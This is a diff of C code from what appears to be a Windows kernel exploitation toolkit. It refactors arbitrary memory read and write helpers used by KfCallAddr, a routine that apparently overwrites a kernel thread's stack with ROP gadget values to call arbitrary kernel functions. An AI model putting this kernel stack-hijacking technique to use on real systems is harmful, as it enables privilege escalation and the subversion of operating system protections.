@@ -24,6 +24,18 @@ static PVOID m_ZwTerminateThread = NULL;
 static PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL;
 static PVOID m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;
 //--------------------------------------------------------------------------------------
+static BOOL MemReadPtr(PVOID Addr, PVOID *Value)
+{
+    // read single pointer from virtual memory address
+    return DriverMemRead(Addr, Value, sizeof(PVOID));
+}
+
+static BOOL MemWritePtr(PVOID Addr, PVOID Value)
+{
+    // write single pointer at virtual memory address
+    return DriverMemWrite(Addr, &Value, sizeof(PVOID));
+}
+//--------------------------------------------------------------------------------------
 static BOOL MatchSign(PUCHAR Data, PUCHAR Sign, int Size)
 {
     for (int i = 0; i < Size; i += 1)
@@ -509,14 +521,14 @@ BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
     PUCHAR StackBase = NULL, KernelStack = NULL;
     
     // get stack base of the thread
-    if (!DriverMemReadPtr(RVATOVA(pThread, KTHREAD_StackBase), (PVOID *)&StackBase))
+    if (!MemReadPtr(RVATOVA(pThread, KTHREAD_StackBase), (PVOID *)&StackBase))
     {
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
         goto _end;
     }
 
     // get stack pointer of the thread
-    if (!DriverMemReadPtr(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID *)&KernelStack))
+    if (!MemReadPtr(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID *)&KernelStack))
     {
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
         goto _end;
@@ -538,7 +550,7 @@ BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
         DWORD_PTR Val = 0;
 
         // read stack value
-        if (!DriverMemReadPtr(Ptr, (PVOID *)&Val))
+        if (!MemReadPtr(Ptr, (PVOID *)&Val))
         {
             DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
             goto _end;
@@ -574,7 +586,7 @@ BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
 
     #define STACK_PUT(_offset_, _val_)                                                          \
                                                                                                 \
-        if (!DriverMemWritePtr(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_)))                   \
+        if (!MemWritePtr(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_)))                         \
         {                                                                                       \
             DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemWritePtr() fails\n");    \
             goto _end;                                                                          \
